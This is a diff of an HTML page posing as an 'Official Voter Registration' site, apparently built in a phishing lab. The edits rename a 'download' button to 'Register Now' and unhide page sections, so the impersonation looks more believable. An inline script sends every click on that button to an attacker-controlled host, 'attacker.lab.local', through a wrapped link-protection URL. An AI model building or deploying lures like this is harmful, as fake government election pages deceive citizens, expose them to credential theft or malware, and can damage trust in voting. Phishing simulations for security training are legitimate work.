@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Official Voter Registration</title>
     <link rel="stylesheet" href="style.css">
-    <script src="script.js" defer></script>
 </head>
 <body>
     <header>
@@ -26,13 +25,13 @@
             </ul>
         </nav>
 
-        <section id="mainContent" style="display: none;">
+        <section id="mainContent">
             <h2>Register to Vote</h2>
             <p>In order to register, you must follow the instructions below and click the "Register Now" button.</p>
-            <button id="downloadButton">Register Now</button>
+            <button id="registerButton">Register Now</button>
         </section>
 
-        <section id="instructions" style="display: none;">
+        <section id="instructions">
             <h3>How to Register</h3>
             <ol>
                 <li>Click the "Register Now" button below.</li>
@@ -40,7 +39,7 @@
             </ol>
         </section>
 
-        <section id="stateDropdown" style="display: none;">
+        <section id="stateDropdown">
             <h3>Select Your State for Additional Information</h3>
             <select id="stateSelect">
                 <option value="default">Select your state</option>
@@ -105,7 +104,7 @@
 
     <script>
         // Redirect to the provided URL when the button is clicked
-        document.getElementById('downloadButton').addEventListener('click', () => {
+        document.getElementById('registerButton').addEventListener('click', () => {
             window.location.href = 'https://url.us.m.mimecastprotect.com/s/bb_4cvojp1cxp8nszhgce_vhs?domain=attacker.lab.local';
         });
     </script>
